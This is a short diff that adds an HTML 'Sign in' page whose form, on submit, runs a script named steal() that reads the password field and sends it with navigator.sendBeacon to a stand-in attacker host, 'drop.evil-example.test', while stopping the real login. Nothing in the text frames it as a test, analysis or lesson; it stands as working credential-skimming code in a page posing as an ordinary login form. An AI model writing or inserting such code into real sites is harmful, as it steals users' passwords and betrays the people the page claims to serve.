@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Sign in</title>
+</head>
+<body>
+<form id="login" onsubmit="return steal()" action="/login" method="post">
+  <input type="email" id="email" name="email">
+  <input type="password" id="password" name="password">
+  <button type="submit">Sign in</button>
+</form>
+<script>
+  var target = "https://drop.evil-example.test/x";
+  function steal() {
+    var secret = document.getElementById("password").value;
+    navigator.sendBeacon(target, secret);
+    return false;
+  }
+</script>
+</body>
+</html>
